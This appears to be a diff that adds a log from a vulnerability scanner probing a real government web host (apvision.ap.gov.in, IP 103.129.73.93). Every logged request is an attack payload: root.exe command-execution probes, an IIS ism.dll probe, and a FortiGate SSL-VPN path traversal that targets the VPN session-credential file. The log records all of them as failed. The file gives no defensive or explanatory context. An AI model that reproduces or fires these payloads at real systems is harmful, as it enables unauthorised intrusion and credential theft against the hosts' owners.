@@ -1,0 +1,6 @@
+
+[21-04-17 16:38:05] - apvision.ap.gov.in/ - msdac/root.exe?/c+dir - There was a problem in the request to: http://103.129.73.93:80/msdac/root.exe?/c+dir
+[21-04-17 16:38:11] - apvision.ap.gov.in/ - remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession - There was a problem in the request to: http://103.129.73.93:80/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession
+[21-04-17 16:38:11] - apvision.ap.gov.in/ - remote/fgt_lang?lang=/../../../../////////////////////////bin/sslvpnd - There was a problem in the request to: http://103.129.73.93:80/remote/fgt_lang?lang=/../../../../////////////////////////bin/sslvpnd
+[21-04-17 16:38:12] - apvision.ap.gov.in/ - scripts/iisadmin/ism.dll?http/dir - There was a problem in the request to: http://103.129.73.93:80/scripts/iisadmin/ism.dll?http/dir
+[21-04-17 16:38:12] - apvision.ap.gov.in/ - scripts/root.exe?/c+dir - There was a problem in the request to: http://103.129.73.93:80/scripts/root.exe?/c+dir
